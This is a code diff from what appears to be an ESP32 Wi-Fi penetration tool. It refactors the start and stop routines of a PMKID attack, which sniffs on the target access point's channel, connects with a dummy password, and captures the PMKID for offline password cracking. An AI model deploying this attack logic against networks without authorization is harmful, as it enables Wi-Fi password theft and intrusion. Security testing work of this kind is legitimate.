@@ -56,16 +56,16 @@ void attack_pmkid_start(attack_config_t *attack_config){
     ESP_LOGI(TAG, "Starting PMKID attack...");
     ap_record = attack_config->ap_record;
     wifictl_sniffer_filter_frame_types(true, false, false);
-    wifictl_sniffer_start(attack_config->ap_record->primary);
-    frame_analyzer_pmkid_capture_start(attack_config->ap_record->bssid);
-    wifictl_sta_connect_to_ap(attack_config->ap_record, "dummypassword");
+    wifictl_sniffer_start(ap_record->primary);
+    frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
+    wifictl_sta_connect_to_ap(ap_record, "dummypassword");
     ESP_ERROR_CHECK(esp_event_handler_register(DATA_FRAME_EVENTS, DATA_FRAME_EVENT_FOUND_PMKID, &pmkid_exit_condition_handler, NULL));
 }
 
 void attack_pmkid_stop(){
     wifictl_sta_disconnect();
     wifictl_sniffer_stop();
-    frame_analyzer_pmkid_capture_stop();
+    frame_analyzer_capture_stop();
     ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &pmkid_exit_condition_handler));
     ESP_LOGD(TAG, "PMKID attack stopped");
 }
